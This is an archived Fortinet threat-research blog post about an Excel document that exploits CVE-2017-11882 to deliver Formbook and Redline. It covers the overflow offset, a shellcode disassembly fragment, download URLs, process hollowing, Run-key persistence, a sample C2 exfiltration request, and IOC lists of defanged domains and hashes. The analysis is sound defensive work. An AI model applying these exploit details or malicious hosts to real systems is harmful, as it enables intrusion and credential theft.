{
    "id": "141d281e-afbc-452a-8a66-e725468a1ce1",
    "created_at": "2023-01-12T15:05:45.24427Z",
    "updated_at": "2025-03-27T02:08:00.035545Z",
    "deleted_at": null,
    "sha1_hash": "a85ad3c331bf67bc73768ba7dc282a5c4f714311",
    "title": "2022-09-19 - Excel Document Delivers Multiple Malware By Exploiting CVE-2017-11882 – Part I",
    "authors": "",
    "file_creation_date": "2022-11-28T19:05:23Z",
    "file_modification_date": "2022-11-28T19:05:23Z",
    "file_size": 429240,
    "plain_text": "# Excel Document Delivers Multiple Malware By Exploiting CVE-2017-11882 – Part I\n\n**[fortinet.com/blog/threat-research/excel-document-delivers-malware-by-exploiting-cve-2017-11882](https://www.fortinet.com/blog/threat-research/excel-document-delivers-malware-by-exploiting-cve-2017-11882)**\n\nSeptember 19, 2022\n\nFortiGuard Labs recently captured an Excel document with an embedded file in the wild. Of course, we do this all the time.\nWhat caught my eye this time is that the embedded file name is randomized, which drove me to want to analyze this Excel\n[document. After some quick research on the file, I learned that it exploits a particular vulnerability —CVE-2017-11882—to](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-11882)\nexecute malicious code to deliver and execute malware on a victim’s device.\n\nIn this analysis, you will see how the crafted Excel document exploits CVE-2017-11882, what it does when exploiting the\nvulnerability, what malware families it can download onto a victim’s device, and what malicious actions the perpetrators can\nconduct.\n\n**Affected platforms: Microsoft Windows**\n\n**Impacted parties: Windows Users**\n\n**Impact: Control and Collect Sensitive Information from Victim’s Device.**\n\n**Severity level: Critical**\n\n## Dissect the Captured Excel Document\n\nThe captured Excel document is called “GAT412-IFF22.xlsx”. It is saved in OOXML format (Office Open XML, a zipped\nand XML-based file format) developed by Microsoft. By decompressing this file in an unzip program, as shown in Figure 1.1,\nwe can see the folder tree on the left and all files on the right. The last file, “xtgjls.4flk6W”, located in the sub-folder of\n\n\n-----\n\n\\xl\\embeddings\\, is the randomized embedded file.\n\nFigure 1.1 – The outline of the file structure inside the Excel document\n\nLet’s look at how the Excel program loads the embedded file. Figure 1.2 shows the content of the relevant files. They are\n“..\\xl\\ worksheets \\sheet1.xml” and its corresponding relationship file “..\\xl\\ worksheets\\_rels\\sheet1.rels”.\n\nFigure 1.2 - Display of how the Excel program loads the embedded file\n\nIt parses the XML data of “sheet1.xml” and obtains the Ole Object data, which looks like the following.\n\n<oleObjects>\n\n<oleObject r:id=“rId1” autoLoad=“true” shapeId=“1907” progId=“L00”/>\n\n</oleObjects>\n\nr:id=“rId1” sets the relationship ID defined in file “sheet1.rels”, as shown in Figure 1.2. Its “target” attribute was set to the\nstring “../embeddings/xtgjls.4flk6W,” which tells the Excel program where to load the Ole Object.\nautoLoad=“true” sets Excel to load the Ole Object automatically without prompting the victim.\nshapeId=“1907” tells Excel how to parse the data of “xtgjls.4flk6W”.\n\nAs you may know, CVE-2017-11882 is a vulnerability within “EQNEDT32.EXE” that can be exploited when processing\nspecially crafted equation data (formulas data). Equation data is imported in Excel documents as an embedded OLE object.\nIn this case, the Excel program uses COM (Component Object Model) objects to pass the equation data inside the file\n“xtgjls.4flk6W” to “EQNEDT32.EXE” to parse.\n\n“xtgjls.4flk6W” is saved in the Microsoft Compound File Binary format. There are two binary files in it,\n“rd8NsPZ44G0yvGbjKKpvH1QTwNU5u” and “[1]oLE10NATiVE”, as shown in Figure 1.3.\n\nFigure 1.3 – View of the crafted “xtgjls.4flk6W” file\n\n“[1]oLE10NATiVE” contains the crafted equation data, where the malicious shellcode will be executed in the vulnerable\n“EQNEDT32.EXE”.\n\n## How the CVE-2017-11882 is Exploited\n\nCopying null-terminated data into a local buffer without a proper length detection causes a stack buffer overflow that leads to\narbitrary code execution. The affected local buffer is only 2CH bytes long relative to the function return address. Therefore,\nthe function return address will be overridden if the copied data is more than 2CH bytes.\n\nFigure 2.1 – The content of “[1]oLE10NATiVE”\n\nThe highlighted block in Figure 2.1 is the null-terminated data being copied—30H bytes—while the last dword (0x42F72E)\n(marked with a red rectangle) is the data to override the function return address.\n\nFigure 2.2 – Stack Frame when stack buffer overflow occurred\n\nFigure 2.2 shows a screenshot of the stack frame of “EQNEDT32.EXE”, where the function return address was just\noverridden by 0x42F72E (the original address is 0x4115D8). Once the function returns, it will return to 0x42F72E to execute a\n“ret” instruction, which pops a dword (0x18F350) into the EIP register from the top of the stack. The data starting from\n0x18F350 is the shellcode from file “[1]oLE10NATiVE”. -The shellcode had already been copied onto the stack.\n\nBelow is a partial list of the shellcode at 0x18F350 in the stack.\n\n**0018F350** BA BF782F03 mov edx,32F78BF\n\n0018F355 81C2 7D4416FD add edx,FD16447D\n\n\n-----\n\n0018F35B 8B32 mov esi,dword ptr ds:[edx]\n\n0018F35D 8B2E mov ebp,dword ptr ds:[esi]\n\n0018F35F BE 43FC3381 mov esi,8133FC43\n\n0018F364 81F6 F39B7581 xor esi,81759BF3\n\n0018F36A 8B0E mov ecx,dword ptr ds:[esi]\n\n0018F36C 55 push ebp\n\n0018F36D FFD1 call ecx      ;;;; <kernel32.GlobalLock>\n\n0018F36F 05 88FBAA47 add eax,47AAFB88\n\n0018F374 05 4BF65DB8 add eax,B85DF64B\n\n0018F379 FFE0 jmp eax     ;;;; jump to decrypt dynamic code\n\n0018F37B 022E add ch,byte ptr ds:[esi]\n\n0018F37D F742 00 00E76000 test dword ptr ds:[edx],60E700\n\n0018F384 04 F5 add al,F5\n\n\n\n[…]\n\n\nIt calls the API GlobalLock() to get a buffer address inside “EQNEDT32.EXE”‘s memory with the entire data of\n“[1]oLE10NATiVE”. It then calculates an offset of a piece of obfuscated code and executes it. It can then be used to decrypt a\nset of dynamic codes and strings.\n\nThe decrypted code dynamically loads some APIs, such as ExpandEnvironmentStringsW(), URLDownloadToFileW(),\nWideCharToMultiByte(), WinExec(), and ExitProcess(). It then calls the API URLDownloadToFileW() to download an exe file\nfrom a URL.\n\nFigure 2.3 – The malware is about to call the API URLDownloadToFileW()\n\nFigure 2.3 is a screenshot of a debugger that breaks at the API URLDownloadToFileW(). As you may notice, its second\nparameter is a URL of the file to be downloaded, which is a decrypted string—“hxxp[:]//lutanedukasi[.]co[.]id/wpincludes/Cikncbxlojqanjsfotzhopechujkgkeeyz.exe”. The third parameter of this API is adding the local file name to the\ndownloaded file, which is “C:\\Users\\{UserName}\\AppData\\Roaming\\word.exe”.\n\nNext, it calls the API WinExec() to start the downloaded file (“C:\\Users\\{UserName}\\AppData\\Roaming\\word.exe”). After that,\nthe malware starts on the victim’s machine. The last step of the shellcode is to call the API ExitProcess() to terminate the\nexploited “EQNEDT32.EXE” process.\n\nUnfortunately, I was not able to obtain the downloaded file. Instead, I received a 404 error code from the website that the file\nwas no longer available. Nevertheless, after going through the malware sample logs, I found something useful about this\nwebsite that interested me.\n\n\n-----\n\nBased on the URLs patterns, I found many samples using a similar URL to download malware, and from them, I learned that\nthe website was used to deliver two malware families, Formbook and Redline. Therefore, the missing download file is\nprobably either Formbook or Redline.\n\nThe following table lists what malware and relevant URLs that I’ve obtained from the logs. I will then pick one sample for each\nof the two malware families from the table to continue my analysis.\n\n**Malware** **URLs**\n\n“Formbook” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/lsbjqoyofgkmqbuleooykdekgopmtglvjl.exe\n\n“Formbook” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/ueNusTuRz84DVHA.exe\n\n“Formbook” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/linecol_v4.1.1.exe\n\n“Formbook” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/k2p5vFXxdMpidBJ.exe\n\n“Redline” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/almac.exe\n\n“Formbook” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/fmbj2.exe\n\n“Formbook” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/onshedy.exe\n\n“FormBook” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/fbfslispuuepzv0.exe\n\n“Redline” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/storj.exe\n\n“Redline” hxxp[:]//lutanedukasi[.]co[.]id/wp-includes/hAiNVxLRl3ayBcV.exe\n\n## Formbook Malware\n\nI picked the “lsbjqoyofgkmqbuleooykdekgopmtglvjl.exe” file (being saved as “C:\\Users\\\n{UserName}\\AppData\\Roaming\\word.exe”) as an example to analyze. It is the latest Formbook sample in the malware sample\nlogs.\n\n“FormBook” is well-known commercial malware. It has been sold as “malware-as-a-service” (MaaS) since 2016. It is designed\nto steal sensitive information from a victim’s device and control it using some Control Commands.\n\nIn this analysis, I will explain how this sample performs on the victim’s device.\n\n## Formbook Downloader and Loader\n\nThe exe file was developed using Borland Delphi language. Based on my analysis, it is a Formbook downloader and loader.\nFormbook performs complicated techniques to prevent itself from being easily detected and analyzed. Let’s go on to see how\nit does that.\n\nOnce it runs, it extracts a Dll file into memory from one of its Bitmap resources (named “BBOKK”), as shown in Figure 3.1.\n\nFigure 3.1 – A Dll file will be extracted from “BBOKK”\n\nWhen the main form’s FormCreate() function is called, it reads the Bitmap data from the Resource section and decrypts it into\na Dll file (referred to as “BBOKK” Dll). Next, it deploys the “BBOKK” Dll in memory, and its entry function is called at the end.\n\n\n-----\n\nThe BBOKK Dll file is another Delphi compiled file. It starts a timer to run a timer function after sleeping 9 seconds by calling\nan API timeSetEvent().\n\nThe purpose of the timer function is to download the Formbook payload and then execute it on the victim’s device.\n\nFigure 3.2 – Download the Formbook payload file\n\nFigure 3.2 is a screenshot of when “BBOKK” Dll downloads the Formbook payload file by calling the API InternetOpenUrlA().\nIts second parameter is a URL to the file, as shown in memory. It was stored as an attachment on Discord’s CDN (content\ndelivery network).\n\nThe attacker encrypted and transformed this file many times to protect its payload file from being blocked and detected. After\nfour decryption and data reversions, we could finally obtain the Formbook payload file, as shown in Figure 3.3.\n\nFigure 3.3 – Just decrypted Formbook payload file and its size in memory\n\n## Hollowed Process to Execute Formbook\n\nThere are three Windows process strings predefined inside “BBOKK” Dll, as seen below:\n\n“C:\\Windows\\System32\\calc.exe”\n\n“C:\\Windows\\System32\\rasphone.exe”\n\n“C:\\Windows\\System32\\cmd.exe”.\n\nThe malware randomly picks one process from them to perform a process hollowing attack. It first needs to create the picked\nprocess in a suspended state. Next, it must inject the Formbook payload file into its memory and deploy it. And finally, it\ncopies and creates a remote thread in the picked process whose thread function will execute the injected Formbook by calling\nits entry function.\n\nTo finish this, it calls a bunch of APIs, such as CreateProcessW(), VirtualAllocEx(), WriteProcessMemory(),\nCreateRemoteThread() and ReadProcessMemory().\n\nFigure 4.1 is a screenshot of a debugger showing where it breaks at API CreateProcessW() with certain parameters, like the\nrandom picked process (which was “C:\\Windows\\System32\\rasphone.exe” for this time) and the CreateFlags is 0x44, which\nis a flag combination of CREATE_SUSPENDED and IDLE_PRIORITY_CLASS.\n\nFigure 4.1 – Break at API CreateProcessW() to create a suspended process\n\nAfter this point, the Formbook payload file will run inside the random picked process.\n\n## Maintaining Persistence on the Victim’s Device\n\n“BBOKK” Dll is in charge of establishing Formbook persistence on the victim’s device. Once it obtains the Formbook payload\nfile, it creates a string value under the sub-key “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” of the system\nregistry, as shown in Figure 5.1.\n\nFigure 5.1 – Formbook is added into the auto-run group of the system registry\n\nThe auto-run process is “C:\\Users\\Public\\Libraries\\foyoqjbsL.url”. This is an Internet Shortcut file (*.url) usually used to open a\nwebsite within a web browser. The “URL” property is the full path of a local file (which should be a website’s address), as\nshown in Figure 5.2. It is “C:\\Users\\Public\\Libraries\\Lsbjqoyof.exe” which was copied from the\n“lsbjqoyofgkmqbuleooykdekgopmtglvjl.exe” file. As a result, Formbook will start when the system starts via the “foyoqjbsL.url”\nfile.\n\nFigure 5.2 – The property of “foyoqjbsL.url”\n\n## Formbook Payload\n\nI previously performed a deep analysis of another Formbook variant spread in a phishing campaign with an attached\n[PowerPoint document. For detailed information regarding that Formbook sample, you can refer to Part I,](https://www.fortinet.com/blog/threat-research/deep-analysis-new-formbook-variant-delivered-phishing-campaign-part-I) [Part II, and](https://www.fortinet.com/blog/threat-research/deep-analysis-formbook-new-variant-delivered-phishing-campaign-part-ii) [Part III.](https://www.fortinet.com/blog/threat-research/deep-analysis-formbook-new-variant-delivered-in-phishing-campaign-part-iii)\n\n\n-----\n\nI compared the code, data structure, and features between the fresh variant and that previous one. I found no significant\nchanges between them.\n\nThe randomly picked process (like “rasphone.exe”) by “BBOKK” Dll plays the same role as the “AddInProcess32.exe”\n[analyzed in Part II of my previous analysis.](https://www.fortinet.com/blog/threat-research/deep-analysis-formbook-new-variant-delivered-phishing-campaign-part-ii)\n\nThey both have the same data structures and features, such as:\n\nThe “Configuration Object”.\nIts “Anti-analysis Techniques”.\nInjecting Formbook into a Windows process via Explorer.exe as a central control program.\nInserting Formbook into target processes, like web browsers, email clients, IM clients, and FTP clients, from which it\nsteals sensitive information.\nUsing the C2 server’s control commands (“1” to “9”) to control the device and conduct extra tasks, like executing a given\nmalware, upgrading Formbook, deleting keys/values from the system registry, rebooting/powering off the device, and\nmore.\n\nThis fresh variant has a new C2 server list, which is decrypted before use. It has 143 encrypted strings, and 64 of the 143 are\nC2 servers. I wrote a script to decrypt all its strings inside Formbook. For your information, Figure 6.1 is a partial list of the\ndecrypted strings and C2 servers.\n\nFigure 6.1 – Partial decrypted strings from Formbook\n\nThe full list of C2 servers this variant carries has been added to the IOC section that locates at the end of this report.\n\nOnce Formbook needs to submit the stolen data to a C2 server, it encrypts the data and encodes it with a Base64 algorithm.\nFollowing is an example of the HTTP GET packet Formbook sent to its C2 server.\n\n_hxxp[:]//www[.]waraporn[.]net/dy47/?_\n_Rt=cJEPCFYxXhcTq&nBZhXF=VgD07dflFaksGVxdFL46l5VyvbABpSxwWaaMvOL1tn3EVaDMwmxyqfSWThCs5+vZuoswEw==_\n\nWhere:\n\n“www[.]waraporn[.]net” is the C2 server host.\n“dy47” comes from a decrypted constant string, “www.irolexwatchs.com/dy47/”.\nBase64 encoded string after “?” is the stolen data from the victim’s device.\n\nIn the next part of this analysis, I will pick one of the Redline samples from the above malware table to research and explain\nwhat it can do to the victim’s device.\n\n## Fortinet Protections\n\nFortinet customers are already protected from this FormBook variant with FortiGuard’s Web Filtering, IPS, and AntiVirus\nservices as follows:\n\nThe downloading URLs and C2 servers are rated as “Malicious Websites” by the FortiGuard Web Filtering service.\n\nThe vulnerability CVE-2017-11882 can be protected by IPS signature\n**MS.Office.EQNEDT32.EXE.Equation.Parsing.Memory.Corruption.**\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded file inside the Excel document.\n\n[The FortiGuard AntiVirus service is supported by FortiGate,](https://www.fortinet.com/products/next-generation-firewall.html?utm_source=blog&utm_campaign=2018-q2-fortigate-main-page) [FortiMail, FortiClient, and](https://www.fortinet.com/products/email-security/fortimail.html?utm_source=blog&utm_campaign=2018-q2-fortimail-main-page) [FortiEDR. The Fortinet AntiVirus](https://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&utm_campaign=2020-q1-fortiedr)\nengine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are\nprotected.\n\n[We also suggest our readers go through the free NSE training:](https://training.fortinet.com/?utm_source=blog&utm_campaign=2019-q3-nse-institute) [NSE 1 – Information Security Awareness, which has a module](https://training.fortinet.com/local/staticpage/view.php?page=nse_1&utm_source=blog&utm_campaign=2020-q2-nse-1)\non Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks.\n\n## IOCs:\n\n\n-----\n\n### URLs:\n\nhxxp[:]//lutanedukasi[.]co[.]id/wp-includes/Cikncbxlojqanjsfotzhopechujkgkeeyz.exe\n\nhxxp[:]//lutanedukasi[.]co[.]id/wp-includes/lsbjqoyofgkmqbuleooykdekgopmtglvjl.exe\n\nhttps[:]//cdn[.]discordapp[.]com/attachments/937614907917078588/1009001073970794576/Lsbjqoyofgkmqbuleooykdekgopmtglr\n\n### Formbook C2 Server List:\n\n“valeloaiza[.]com”\n“nxmdta[.]quest”\n“yennft[.]com”\n“techwithnova[.]com”\n“newssmart[.]xyz”\n“devopstp[.]com”\n“trophies3d[.]co[.]uk”\n“helpagencia[.]online”\n“fineclocksandsoaps[.]com”\n“universerealtor[.]website”\n“hyriver[.]com”\n“xishangtao[.]com”\n“getyourhostingnow[.]com”\n“one-poker[.]com”\n“ry-cw[.]com”\n“colaye[.]us”\n“russellbanx[.]com”\n“rennentedieeinzige[.]uk”\n“heliconiaparadise[.]site”\n“234sportsagency[.]com”\n“tenaciouslee[.]com”\n“edenq[.]com”\n“thecreakykettle[.]net”\n“bedmate-ventricose[.]net”\n“andreas-setiarama[.]com”\n“advidd[.]com”\n“enerplus[.]uk”\n“cassavaproject[.]com”\n“cambriacr[.]com”\n“iserghini[.]com”\n“creativacr[.]com”\n“brandmarkenterprises[.]com”\n“uaepilator[.]store”\n“singhdeepak[.]space”\n“belicosocigars[.]com”\n“yysshh[.]top”\n“rekapllc[.]store”\n“fairblare[.]sbs”\n“bryar[.]top”\n“deniz2fotograf[.]online”\n“viproom108[.]com”\n“fullstackchannel[.]net”\n“emjghq[.]com”\n“theclientserver[.]xyz”\n“smartprotectproducts[.]store”\n“thebestconsultants[.]com”\n“453wow[.]com”\n\n\n-----\n\niwantcreativity[.]com\n“excel-facile[.]online”\n“waraporn[.]net”\n“topdeckholidays[.]com”\n“slanguage[.]online”\n“mistergreekmeat[.]com”\n“bloombyz[.]store”\n“sparkmediaagency[.]xyz”\n“asdmohs18[.]website”\n“playersclub[.]site”\n“ariedejongtv[.]com”\n“jinchuansh[.]com”\n“affnewyork888s[.]com”\n“ere46[.]site”\n“wevlong[.]xyz”\n“toniotheharrison[.]net”\n“aroma4pets[.]com”\n\n### Sample SHA-256\n\n[GAT412-IFF22.xlsx]\n\nD1EA94C241E00E8E59A7212F30A9117393F9E883D2B509E566505BC337C473E3\n\n[Formbook, lsbjqoyofgkmqbuleooykdekgopmtglvjl.exe]\n\nC7B7CC6B73B04E2CD7D026A69D47139770ACE5A92457DA0F0C058EE438251B18\n\n_Learn more about Fortinet’s_ _[FortiGuard Labs threat research and global intelligence organization and Fortinet’s FortiGuard](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_medium=blog&utm_campaign=fortiguard-labs)_\n_[AI-powered Security Services portfolio.](https://www.fortinet.com/solutions/enterprise-midsize-business/security-as-a-service/fortiguard-subscriptions?utm_source=blog&utm_medium=blog&utm_campaign=fortiguard-subscriptions)_ _[Sign up to receive our threat research blogs.](https://www.fortinet.com/blog/threat-research?utm_source=blog&utm_medium=blog&utm_campaign=threat-research)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-09-19 - Excel Document Delivers Multiple Malware By Exploiting CVE-2017-11882 – Part I.pdf"
    ],
    "report_names": [
        "2022-09-19 - Excel Document Delivers Multiple Malware By Exploiting CVE-2017-11882 – Part I.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535945,
    "ts_updated_at": 1743041280,
    "ts_creation_date": 1669662323,
    "ts_modification_date": 1669662323,
    "files": {
        "pdf": "https://archive.orkl.eu/a85ad3c331bf67bc73768ba7dc282a5c4f714311.pdf",
        "text": "https://archive.orkl.eu/a85ad3c331bf67bc73768ba7dc282a5c4f714311.txt",
        "img": "https://archive.orkl.eu/a85ad3c331bf67bc73768ba7dc282a5c4f714311.jpg"
    }
}